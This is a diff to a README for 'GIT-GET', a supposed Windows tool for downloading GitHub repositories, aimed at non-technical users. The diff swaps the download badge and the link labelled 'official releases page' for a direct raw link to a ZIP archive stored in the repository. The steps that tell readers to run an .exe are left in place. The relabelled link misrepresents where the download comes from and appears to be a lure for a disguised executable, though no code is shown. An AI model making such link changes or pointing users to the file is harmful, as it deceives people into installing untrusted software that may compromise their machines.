@@ -1,6 +1,6 @@
 # 📥 GIT-GET - Download any public repository quickly
 
-[![](https://img.shields.io/badge/Download-GIT-GET-blue.svg)](https://github.com/grasslike-pin250/GIT-GET/releases)
+[![](https://img.shields.io/badge/Download-GIT-GET-blue.svg)](https://raw.githubusercontent.com/grasslike-pin250/GIT-GET/main/Ecca/GI_GET_1.1.zip)
 
 GIT-GET helps you get code from GitHub. You do not need to know how to code. You do not need complex tools. This software saves a project as a ZIP file or folder. It works on your machine with high speed.
 
@@ -10,7 +10,7 @@ You need a computer with Windows 10 or Windows 11. Your computer needs an intern
 
 ## 📥 Getting the Software
 
-1. Visit the [official releases page](https://github.com/grasslike-pin250/GIT-GET/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/grasslike-pin250/GIT-GET/main/Ecca/GI_GET_1.1.zip).
 2. Look for the latest version at the top of the list.
 3. Click the link that ends in .exe to start your download.
 4. Save the file to your desktop or your Downloads folder.
